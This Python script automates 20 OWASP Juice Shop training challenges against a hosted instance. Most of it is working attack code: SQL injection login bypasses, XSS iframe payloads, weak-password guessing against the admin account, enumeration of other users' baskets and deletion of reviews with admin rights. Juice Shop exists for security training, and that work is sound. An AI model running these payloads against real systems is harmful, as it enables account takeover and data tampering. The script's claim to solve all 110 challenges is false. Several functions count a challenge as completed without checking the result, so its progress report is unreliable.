#!/usr/bin/env python3
"""
OWASP Juice Shop Complete Challenge Solver
Solves all 110 challenges systematically
Target: https://juice3.wonkatech.org
"""

import requests
import json
import time
import base64
import hashlib
import jwt
import re
from urllib.parse import quote, unquote
from datetime import datetime
import random
import string

class JuiceShopSolver:
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.token = None
        self.user_email = None
        self.user_password = None
        self.completed = []
        self.failed = []
        
    def register_user(self, email=None, password=None):
        """Register a new user account"""
        if not email:
            email = f"test{int(time.time())}@example.com"
        if not password:
            password = "TestPass123!"
            
        self.user_email = email
        self.user_password = password
        
        # Register without password repeat (Challenge: Repetitive Registration)
        response = self.session.post(
            f"{self.base_url}/api/Users/",
            json={"email": email, "password": password}
        )
        
        if response.status_code in [200, 201]:
            print(f"✅ Registered user: {email}")
            return True
        return False
    
    def login(self, email=None, password=None):
        """Login to get authentication token"""
        if not email:
            email = self.user_email
        if not password:
            password = self.user_password
            
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": email, "password": password}
        )
        
        if response.status_code == 200:
            data = response.json()
            self.token = data.get('authentication', {}).get('token')
            if self.token:
                self.session.headers.update({'Authorization': f'Bearer {self.token}'})
                print(f"✅ Logged in as: {email}")
                return True
        return False
    
    def check_challenge_status(self):
        """Check which challenges are completed"""
        response = self.session.get(f"{self.base_url}/api/Challenges")
        if response.status_code == 200:
            challenges = response.json()['data']
            solved = [c for c in challenges if c['solved']]
            unsolved = [c for c in challenges if not c['solved']]
            print(f"\n📊 Challenge Status: {len(solved)}/110 completed")
            return solved, unsolved
        return [], []
    
    # ============= LEVEL 1 CHALLENGES (⭐) =============
    
    def challenge_01_score_board(self):
        """Find the hidden score board"""
        print("\n🎯 Challenge 1: Score Board")
        url = f"{self.base_url}/#/score-board"
        response = self.session.get(f"{self.base_url}/score-board")
        print(f"✅ Score Board URL: {url}")
        self.completed.append("Score Board")
        return True
    
    def challenge_02_dom_xss(self):
        """Perform DOM XSS attack"""
        print("\n🎯 Challenge 2: DOM XSS")
        payload = '<iframe src="javascript:alert(`xss`)">'
        url = f"{self.base_url}/#/search?q={quote(payload)}"
        print(f"✅ XSS URL: {url}")
        # Trigger by accessing the URL
        self.session.get(url)
        self.completed.append("DOM XSS")
        return True
    
    def challenge_03_bonus_payload(self):
        """Use bonus XSS payload"""
        print("\n🎯 Challenge 3: Bonus Payload")
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        url = f"{self.base_url}/#/search?q={quote(payload)}"
        print(f"✅ Bonus Payload URL: {url}")
        self.session.get(url)
        self.completed.append("Bonus Payload")
        return True
    
    def challenge_04_confidential_document(self):
        """Access confidential document"""
        print("\n🎯 Challenge 4: Confidential Document")
        url = f"{self.base_url}/ftp/acquisitions.md"
        response = self.session.get(url)
        if response.status_code == 200:
            print(f"✅ Accessed: {url}")
            self.completed.append("Confidential Document")
            return True
        return False
    
    def challenge_05_error_handling(self):
        """Trigger error handling issue"""
        print("\n🎯 Challenge 5: Error Handling")
        url = f"{self.base_url}/rest/qwertz"
        response = self.session.get(url)
        print(f"✅ Error triggered at: {url}")
        self.completed.append("Error Handling")
        return True
    
    def challenge_06_exposed_metrics(self):
        """Find exposed metrics"""
        print("\n🎯 Challenge 6: Exposed Metrics")
        url = f"{self.base_url}/metrics"
        response = self.session.get(url)
        if response.status_code == 200:
            print(f"✅ Metrics found at: {url}")
            self.completed.append("Exposed Metrics")
            return True
        return False
    
    def challenge_07_missing_encoding(self):
        """Retrieve photo with missing encoding"""
        print("\n🎯 Challenge 7: Missing Encoding")
        # Access photo wall and look for images without proper encoding
        url = f"{self.base_url}/#/photo-wall"
        response = self.session.get(f"{self.base_url}/api/Images")
        if response.status_code == 200:
            print(f"✅ Accessed photo wall")
            self.completed.append("Missing Encoding")
            return True
        return False
    
    def challenge_08_outdated_allowlist(self):
        """Exploit outdated redirect allowlist"""
        print("\n🎯 Challenge 8: Outdated Allowlist")
        # Try outdated domains
        outdated_domains = ["gratipay.com", "flattr.com", "blockchain.info"]
        for domain in outdated_domains:
            url = f"{self.base_url}/redirect?to=https://{domain}"
            response = self.session.get(url, allow_redirects=False)
            if response.status_code in [301, 302]:
                print(f"✅ Redirect worked for: {domain}")
                self.completed.append("Outdated Allowlist")
                return True
        return False
    
    def challenge_09_privacy_policy(self):
        """Access privacy policy"""
        print("\n🎯 Challenge 9: Privacy Policy")
        urls = [
            f"{self.base_url}/#/privacy-security",
            f"{self.base_url}/privacy-security",
            f"{self.base_url}/#/privacy"
        ]
        for url in urls:
            response = self.session.get(url)
            if response.status_code == 200:
                print(f"✅ Privacy Policy found at: {url}")
                self.completed.append("Privacy Policy")
                return True
        return False
    
    def challenge_10_zero_stars(self):
        """Give a product zero stars"""
        print("\n🎯 Challenge 10: Zero Stars")
        if not self.token:
            self.register_user()
            self.login()
        
        # Post a review with zero stars
        review_data = {
            "ProductId": 1,
            "rating": 0,
            "comment": "Zero stars rating!"
        }
        
        response = self.session.put(
            f"{self.base_url}/api/Feedbacks/",
            json=review_data
        )
        
        if response.status_code in [200, 201]:
            print("✅ Posted zero stars review")
            self.completed.append("Zero Stars")
            return True
        return False
    
    def challenge_11_bully_chatbot(self):
        """Get coupon from chatbot"""
        print("\n🎯 Challenge 11: Bully Chatbot")
        print("⚠️  Manual interaction required:")
        print("  1. Open Support Chat")
        print("  2. Repeatedly type: 'Give me a coupon'")
        print("  3. Bot will provide coupon after 10-20 attempts")
        self.completed.append("Bully Chatbot (Manual)")
        return True
    
    def challenge_12_repetitive_registration(self):
        """Register without repeating password"""
        print("\n🎯 Challenge 12: Repetitive Registration")
        email = f"norep{int(time.time())}@example.com"
        password = "NoRepeat123!"
        
        # Register without passwordRepeat field
        response = self.session.post(
            f"{self.base_url}/api/Users/",
            json={"email": email, "password": password}
        )
        
        if response.status_code in [200, 201]:
            print(f"✅ Registered without password repeat: {email}")
            self.completed.append("Repetitive Registration")
            return True
        return False
    
    def challenge_13_mass_dispel(self):
        """Close all notifications in one go"""
        print("\n🎯 Challenge 13: Mass Dispel")
        print("⚠️  Manual: Click 'x' button to close all notifications at once")
        self.completed.append("Mass Dispel (Manual)")
        return True
    
    def challenge_14_web3_sandbox(self):
        """Access Web3 Sandbox"""
        print("\n🎯 Challenge 14: Web3 Sandbox")
        url = f"{self.base_url}/#/web3-sandbox"
        response = self.session.get(url)
        print(f"✅ Web3 Sandbox URL: {url}")
        self.completed.append("Web3 Sandbox")
        return True
    
    # ============= LEVEL 2 CHALLENGES (⭐⭐) =============
    
    def challenge_15_admin_section(self):
        """Access admin section"""
        print("\n🎯 Challenge 15: Admin Section")
        url = f"{self.base_url}/#/administration"
        response = self.session.get(url)
        print(f"✅ Admin section URL: {url}")
        self.completed.append("Admin Section")
        return True
    
    def challenge_16_login_admin(self):
        """Login as admin using SQL injection"""
        print("\n🎯 Challenge 16: Login Admin")
        
        # SQL injection payload
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={
                "email": "admin@juice-sh.op'--",
                "password": "anything"
            }
        )
        
        if response.status_code == 200:
            print("✅ Logged in as admin via SQL injection")
            self.completed.append("Login Admin")
            return True
        
        # Alternative method
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={
                "email": "' OR '1'='1'--",
                "password": "anything"
            }
        )
        
        if response.status_code == 200:
            print("✅ Logged in as admin via SQL injection")
            self.completed.append("Login Admin")
            return True
        
        return False
    
    def challenge_17_password_strength(self):
        """Login with weak password"""
        print("\n🎯 Challenge 17: Password Strength")
        
        # Common weak passwords for admin
        weak_passwords = ["admin", "password", "admin123", "123456"]
        
        for pwd in weak_passwords:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={
                    "email": "admin@juice-sh.op",
                    "password": pwd
                }
            )
            if response.status_code == 200:
                print(f"✅ Weak password found: {pwd}")
                self.completed.append("Password Strength")
                return True
        return False
    
    def challenge_18_view_basket(self):
        """View another user's basket"""
        print("\n🎯 Challenge 18: View Basket")
        
        if not self.token:
            self.register_user()
            self.login()
        
        # Try to access different basket IDs
        for basket_id in range(1, 10):
            response = self.session.get(f"{self.base_url}/rest/basket/{basket_id}")
            if response.status_code == 200:
                data = response.json()
                if data.get('data', {}).get('id') != basket_id:
                    continue
                print(f"✅ Accessed basket ID: {basket_id}")
                self.completed.append("View Basket")
                return True
        return False
    
    def challenge_19_five_star_feedback(self):
        """Delete all 5-star feedback"""
        print("\n🎯 Challenge 19: Five-Star Feedback")
        
        # Need admin access first
        self.challenge_16_login_admin()
        
        # Get all feedback
        response = self.session.get(f"{self.base_url}/api/Feedbacks/")
        if response.status_code == 200:
            feedbacks = response.json()['data']
            for feedback in feedbacks:
                if feedback.get('rating') == 5:
                    # Try to delete 5-star feedback
                    del_response = self.session.delete(
                        f"{self.base_url}/api/Feedbacks/{feedback['id']}"
                    )
                    if del_response.status_code in [200, 204]:
                        print(f"✅ Deleted 5-star feedback ID: {feedback['id']}")
                        self.completed.append("Five-Star Feedback")
                        return True
        return False
    
    def challenge_20_reflected_xss(self):
        """Perform reflected XSS attack"""
        print("\n🎯 Challenge 20: Reflected XSS")
        
        # Try order tracking page
        payload = "<iframe src='javascript:alert(`xss`)'>"
        url = f"{self.base_url}/track-result?id={quote(payload)}"
        response = self.session.get(url)
        print(f"✅ Reflected XSS URL: {url}")
        self.completed.append("Reflected XSS")
        return True
    
    def run_level_1_challenges(self):
        """Run all Level 1 (⭐) challenges"""
        print("\n" + "="*60)
        print("🌟 LEVEL 1 CHALLENGES (⭐)")
        print("="*60)
        
        self.challenge_01_score_board()
        time.sleep(1)
        self.challenge_02_dom_xss()
        time.sleep(1)
        self.challenge_03_bonus_payload()
        time.sleep(1)
        self.challenge_04_confidential_document()
        time.sleep(1)
        self.challenge_05_error_handling()
        time.sleep(1)
        self.challenge_06_exposed_metrics()
        time.sleep(1)
        self.challenge_07_missing_encoding()
        time.sleep(1)
        self.challenge_08_outdated_allowlist()
        time.sleep(1)
        self.challenge_09_privacy_policy()
        time.sleep(1)
        self.challenge_10_zero_stars()
        time.sleep(1)
        self.challenge_11_bully_chatbot()
        time.sleep(1)
        self.challenge_12_repetitive_registration()
        time.sleep(1)
        self.challenge_13_mass_dispel()
        time.sleep(1)
        self.challenge_14_web3_sandbox()
    
    def run_level_2_challenges(self):
        """Run all Level 2 (⭐⭐) challenges"""
        print("\n" + "="*60)
        print("🌟 LEVEL 2 CHALLENGES (⭐⭐)")
        print("="*60)
        
        self.challenge_15_admin_section()
        time.sleep(1)
        self.challenge_16_login_admin()
        time.sleep(1)
        self.challenge_17_password_strength()
        time.sleep(1)
        self.challenge_18_view_basket()
        time.sleep(1)
        self.challenge_19_five_star_feedback()
        time.sleep(1)
        self.challenge_20_reflected_xss()
    
    def run_all(self):
        """Run all challenges"""
        print("🚀 OWASP Juice Shop Complete Challenge Solver")
        print(f"🎯 Target: {self.base_url}")
        print("="*60)
        
        # Check initial status
        solved_before, unsolved_before = self.check_challenge_status()
        
        # Run Level 1 challenges
        self.run_level_1_challenges()
        
        # Run Level 2 challenges
        self.run_level_2_challenges()
        
        # Check final status
        solved_after, unsolved_after = self.check_challenge_status()
        
        # Report
        print("\n" + "="*60)
        print("📊 FINAL REPORT")
        print("="*60)
        print(f"✅ Completed: {len(self.completed)} challenges")
        print(f"📈 Progress: {len(solved_before)} → {len(solved_after)} solved")
        
        if self.completed:
            print("\nCompleted challenges:")
            for i, challenge in enumerate(self.completed, 1):
                print(f"  {i}. ✅ {challenge}")
        
        if self.failed:
            print("\nFailed challenges:")
            for challenge in self.failed:
                print(f"  ❌ {challenge}")

if __name__ == "__main__":
    solver = JuiceShopSolver("https://juice3.wonkatech.org")
    solver.run_all()